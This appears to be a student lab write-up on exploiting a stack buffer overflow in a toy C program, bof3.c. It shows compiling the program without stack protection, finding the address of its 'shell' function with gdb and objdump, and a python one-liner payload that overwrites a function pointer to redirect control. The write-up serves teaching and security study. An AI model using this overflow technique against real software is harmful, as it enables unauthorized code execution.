# Understand bof3.c 
In this case, we see that the function is treated like a variable, so we only need to change the memory address of the variable to transfer control.
## Stackframe
![image](https://github.com/user-attachments/assets/79b2b42b-8a23-445e-90a1-36b6d4134ebf)
## Vulnerability
The function fgets(buf, 133, stdin) receives a maximum of 133 bytes, but buf only has 128 bytes, resulting in 5 extra bytes and causing a buffer overflow.
# Start attacking bof3.c 
## Compiling the file without stack restriction
`gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2`  
![image](https://github.com/user-attachments/assets/6349467a-5514-4fb3-b047-8aa99fb45fc6)
## In order to attack the file, we need to know the address of the shell we are using
- Use gdb to find the address of the shell function: 0x0804845b  
`gdb bof3.out` and `disas shell`
![image](https://github.com/user-attachments/assets/bbbd5758-2232-4ff8-905c-eb80238cdcb2)
- Or we use at outer by using `objdump -d bof3.out | grep shell`  
![image](https://github.com/user-attachments/assets/45dde156-3b12-4d5f-a010-5985cdf1efa8)
## To calculate how many bytes to inject to replace a function's return address with the shell function address, we need to determine
`echo $(python -c "print('a'*128+'\x5b\x84\x04\x08')") | ./bof3.out`  
![image](https://github.com/user-attachments/assets/d3fc6ea6-8693-416c-9b15-dc511779b2a2)


